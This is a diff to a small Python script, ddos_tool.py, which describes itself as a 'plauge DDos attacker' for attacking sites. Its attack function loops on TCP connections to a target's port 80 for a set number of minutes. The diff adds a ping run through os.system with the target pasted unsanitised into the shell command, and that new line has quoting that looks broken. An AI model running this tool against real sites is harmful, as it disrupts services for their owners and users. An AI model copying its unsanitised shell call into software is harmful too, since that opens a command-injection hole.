@@ -1,6 +1,7 @@
 # ddos_tool.py
 import socket
 import time
+import os
 
 def attack(target, duration):
     timeout = time.time() + duration * 60
@@ -9,7 +10,7 @@ def attack(target, duration):
         s.settimeout(1)
         try:
             s.connect((target, 80))
-            print("Successfully plagued! 🤢🦠")
+            print(f"Successfully plagued! 🤢🦠 | Ping: {os.system(f'ping -c 1 {target} > /dev/null 2>&1 && echo "Ping: " || echo "Ping: "')} ")
         except Exception as e:
             print(f"Error: {e}")
         finally:
@@ -17,6 +18,7 @@ def attack(target, duration):
     print("Attack completed.")
 
 def main():
+    os.system('clear' if os.name == 'posix' else 'cls')
     print ("WELCOME TO ENOMS DOSER")
     print ("this is plauge DDos attacker")
     print ("used to infect sites")
